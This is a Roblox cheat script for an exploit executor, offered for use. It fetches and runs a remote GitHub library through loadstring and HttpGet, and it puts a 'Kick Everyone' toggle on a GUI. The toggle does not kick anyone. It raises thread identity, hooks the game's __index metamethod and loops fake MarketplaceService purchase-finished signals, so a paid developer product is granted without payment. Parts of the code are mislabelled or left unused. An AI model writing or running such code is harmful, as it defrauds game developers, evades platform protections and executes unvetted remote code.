local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()

local PhantomForcesWindow = Library:NewWindow("boggle.cc")

local KillingCheats = PhantomForcesWindow:NewSection("Boys ONLY. NO GIRLS ALLOWED")

KillingCheats:CreateToggle("Kick Everyone", function(Rebi) G_Rebirth = Rebi while G_Rebirth do local args = { [1] = math.huge }
local LOAD_TIME = tick()

local queueonteleport = queue_on_teleport or queueonteleport
local setclipboard = toclipboard or setrbxclipboard or setclipboard
local clonefunction = clonefunc or clonefunction
local setthreadidentity = set_thread_identity or setthreadcaps or setthreadidentity
local firetouchinterests = fire_touch_interests or firetouchinterests

if getnamecallmethod then
    local getnamecallmethod = get_namecall_method or getnamecallmethod
end

local a = Instance.new("Part")
for b, c in pairs(getreg()) do
    if type(c) == "table" and #c then
        if rawget(c, "__mode") == "kvs" then
            for d, e in pairs(c) do
                if e == a then
                    getgenv().InstanceList = c
                    break
                end
            end
        end
    end
end

local f = {}
function f.invalidate(g)
    if not InstanceList then
        return
    end
    for b, c in pairs(InstanceList) do
        if c == g then
            InstanceList[b] = nil
            return g
        end
    end
end

if not cloneref then
    getgenv().cloneref = f.invalidate
end

getrenv().Visit = cloneref(game:GetService("Visit"))
getrenv().MarketplaceService = cloneref(game:GetService("MarketplaceService"))
getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local Players = cloneref(game:GetService("Players"))

task.wait(0.25)

getgenv().stealth_call = function(script)
    getrenv()._set = clonefunction(setthreadidentity)
    local old
    old =
        hookmetamethod(
        game,
        "__index",
        function(a, b)
            task.spawn(
                function()
                    _set(7)
                    task.wait(0.1)
                    local went, error =
                        pcall(
                        function()
                            loadstring(script)()
                        end
                    )
                    
                    if went then
                        local check = Instance.new("LocalScript")
                        check.Parent = Visit
                    end
                end
            )
            hookmetamethod(game, "__index", old)
            return old(a, b)
        end
    )
end

local function simulateProductPurchase(productIds)
    for _, productId in ipairs(productIds) do
        pcall(function()
            local signal = string.format(
                "MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, %d, true)",
                productId
            )
            stealth_call(signal)
        end)
        task.wait(0.2)
    end
end

local productIds = {2653775646}

task.spawn(function()
    simulateProductPurchase(productIds)
    pcall(function()
    end)
end) wait(0.01) end end)